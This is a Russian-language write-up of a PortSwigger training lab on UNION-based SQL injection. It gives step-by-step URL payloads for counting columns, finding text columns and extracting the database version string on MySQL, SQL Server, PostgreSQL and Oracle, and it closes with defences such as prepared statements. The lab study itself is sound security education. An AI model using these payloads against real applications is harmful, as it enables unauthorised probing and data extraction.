# 📘 PortSwigger Lab: SQL injection attack, querying the database type and version

<a id="top"></a>

> 🔗 Лаба: https://portswigger.net/web-security/sql-injection/union-attacks/lab-querying-database-version-mysql-microsoft

---

# 📑 Оглавление

- [🎯 Цель](#goal)
- [🧠 Идея атаки](#idea)
- [🏗 Что нужно знать](#how)
- [🔍 Шаг 1 — Column count](#step1)
- [🔍 Шаг 2 — Text columns](#step2)
- [🔍 Шаг 3 — Version string](#step3)
- [🧩 Payloads для разных БД](#payloads)
- [💥 Почему атака сработала](#why)
- [🛡 Защита](#defense)
- [🛠 Чеклист](#checklist)

---

<a id="goal"></a>

# 🎯 Цель

Вывести строку версии базы данных через UNION SQL Injection.

---

<a id="idea"></a>

# 🧠 Идея атаки

Если приложение возвращает SQL results в response, можно добавить свой SELECT через `UNION` и вывести metadata БД.

```sql
UNION SELECT @@version,NULL
```

---

<a id="how"></a>

# 🏗 Что нужно знать

Для UNION attack нужно определить:
1. сколько колонок возвращает оригинальный SELECT;
2. какие колонки принимают text;
3. какой version syntax используется в конкретной БД.

---

<a id="step1"></a>

# 🔍 Шаг 1 — Column count

```http
/filter?category=Accessories'+UNION+SELECT+NULL#
```

❌ Error

```http
/filter?category=Accessories'+UNION+SELECT+NULL,NULL#
```

✅ Success

---

# Вывод

Оригинальный SELECT содержит:
# 2 колонки

---

<a id="step2"></a>

# 🔍 Шаг 2 — Text columns

```http
/filter?category=Accessories'+UNION+SELECT+'abc','def'#
```

Если `abc` и `def` появились на странице:
- колонок 2;
- обе принимают string values.

---

<a id="step3"></a>

# 🔍 Шаг 3 — Version string

Для MySQL / Microsoft SQL Server используется:

```sql
@@version
```

Payload:

```http
/filter?category=Accessories'+UNION+SELECT+@@version,NULL#
```

---

# Результат

В response появляется строка версии БД:

```text
MySQL 8.0.x
```

или:

```text
Microsoft SQL Server 2016
```

---

<a id="payloads"></a>

# 🧩 Payloads для разных БД

## MySQL

```http
/filter?category=Accessories'+UNION+SELECT+@@version,NULL#
```

```http
/filter?category=Accessories'+UNION+SELECT+NULL,@@version#
```

Комментарий:

```sql
#
```

или:

```sql
-- 
```

Важно: в MySQL после `--` нужен пробел.

---

## Microsoft SQL Server

```http
/filter?category=Accessories'+UNION+SELECT+@@version,NULL--
```

```http
/filter?category=Accessories'+UNION+SELECT+NULL,@@version--
```

---

## PostgreSQL

```http
/filter?category=Accessories'+UNION+SELECT+version(),NULL--
```

```http
/filter?category=Accessories'+UNION+SELECT+NULL,version()--
```

---

## Oracle

Oracle требует `FROM`.

```http
/filter?category=Accessories'+UNION+SELECT+banner,NULL+FROM+v$version--
```

```http
/filter?category=Accessories'+UNION+SELECT+NULL,banner+FROM+v$version--
```

---

<a id="why"></a>

# 💥 Почему атака сработала

Потому что приложение:
- вставляло input напрямую в SQL;
- не использовало prepared statements;
- возвращало SQL results в HTTP response.

---

<a id="defense"></a>

# 🛡 Защита

- Prepared Statements
- Parameterized Queries
- Input Validation
- Least Privilege
- Не показывать database errors пользователю
- WAF как дополнительный слой

Безопасный пример:

```php
$stmt = $pdo->prepare("SELECT * FROM products WHERE category=?");
```

---

<a id="checklist"></a>

# 🛠 Чеклист

- [ ] найден SQL Injection
- [ ] найдено количество колонок
- [ ] найдены text-compatible columns
- [ ] подобран syntax под конкретную БД
- [ ] выведена database version
- [ ] определен database type

---

# ⬆ Наверх

[Вернуться к началу](#top)
